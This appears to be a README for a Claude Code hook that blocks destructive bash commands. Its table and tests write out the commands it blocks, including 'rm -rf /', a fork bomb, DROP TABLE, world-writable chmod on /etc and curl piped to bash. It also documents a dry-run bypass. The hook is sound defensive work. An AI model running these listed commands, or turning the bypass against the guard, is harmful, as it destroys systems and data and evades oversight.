# Pre-Tool-Use Hook — Destructive Command Blocker

> Claude Code hook that intercepts dangerous bash commands before execution.

## What it blocks

| Pattern | Example blocked | Reason |
|---------|----------------|--------|
| `rm -rf` of system paths | `rm -rf /`, `rm -rf /etc` | Would destroy system files |
| `DROP TABLE / DATABASE` | `DROP TABLE users` | Permanent data loss |
| `TRUNCATE TABLE` | `TRUNCATE logs` | Instant, irreversible deletion |
| `DELETE FROM` no WHERE | `DELETE FROM users` | Would delete every row |
| `git push --force` | `git push -f origin main` | Rewrites shared history |
| Fork bomb | `:(){ :\|:& };:` | System crash |
| `chmod 777` on system dirs | `chmod -R 777 /etc` | Security vulnerability |
| curl/wget pipe to shell | `curl x.com/sh \| bash` | Code execution risk |

## Installation (2 commands)

```bash
curl -o ~/.claude/hooks/pre-tool-use https://raw.githubusercontent.com/ybbuge2537/claude-builders-bounty/feat/pre-tool-use-hook/pre-tool-use
chmod +x ~/.claude/hooks/pre-tool-use
```

## Configuration

Enable in your Claude Code settings:

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "command": "~/.claude/hooks/pre-tool-use"
      }
    ]
  }
}
```

## How it works

1. Claude Code sends tool call info as JSON to stdin
2. Hook scans the command for dangerous patterns
3. Safe commands → `{"decision": "allow"}`
4. Dangerous commands → `{"decision": "block", "reason": "..."}`
5. Blocked attempts are logged to `~/.claude/hooks/blocked.log`

## Testing

```bash
# Test: should block
echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"},"cwd":"/tmp"}' | python3 pre-tool-use

# Test: should allow
echo '{"tool_name":"Bash","tool_input":{"command":"ls -la"},"cwd":"/tmp"}' | python3 pre-tool-use

# Dry run mode (log only, don't block)
CLAUDE_HOOK_DRY_RUN=1 echo '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"},"cwd":"/tmp"}' | python3 pre-tool-use
```

## Bypass (when you're sure)

```bash
export CLAUDE_HOOK_DRY_RUN=1  # log but don't block
```

Or run the command directly in your terminal (not through Claude Code).

## Log format

```
[2026-05-26T09:00:00Z] BLOCKED
  Project: /home/user/my-project
  Command: rm -rf /etc/nginx
  Rule:    rm -rf of critical system path
  ──────────────────────────────────────────
```

## Requirements

- Python 3.8+ (standard library only, zero dependencies)
- Claude Code with hooks enabled
